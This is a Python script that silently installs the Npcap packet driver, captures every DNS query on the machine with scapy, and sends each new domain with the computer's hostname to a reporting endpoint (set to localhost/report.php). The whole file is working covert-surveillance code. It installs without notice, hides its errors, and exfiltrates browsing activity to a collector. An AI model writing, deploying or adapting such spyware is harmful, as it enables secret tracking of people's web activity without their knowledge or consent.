import subprocess
from scapy.all import sniff, DNSQR
import socket
import requests
import threading

hostname = socket.gethostname()
server_url = "http://localhost/report.php"
visited_domains = set()

def install_npcap_silently():
    try:
        result = subprocess.run(["sc query npcap"], shell=True, capture_output=True, text=True)
        if "FAILED" in result.stdout or "does not exist" in result.stdout or "not recognized" in result.stdout:
            subprocess.run(["npcap.exe", "/S"], shell=True)
    except:
        pass

def send_to_server(domain):
    payload = {
        "hostname": hostname,
        "domain": domain
    }
    try:
        requests.post(server_url, json=payload)
    except:
        pass

def packet_callback(packet):
    if packet.haslayer(DNSQR):
        domain = packet[DNSQR].qname.decode().rstrip('.')
        if domain not in visited_domains:
            visited_domains.add(domain)
            send_to_server(domain)

def start_sniffing():
    sniff(filter="udp port 53", prn=packet_callback, store=0)

if __name__ == "__main__":
    install_npcap_silently()
    t = threading.Thread(target=start_sniffing)
    t.daemon = True
    t.start()
    while True:
        pass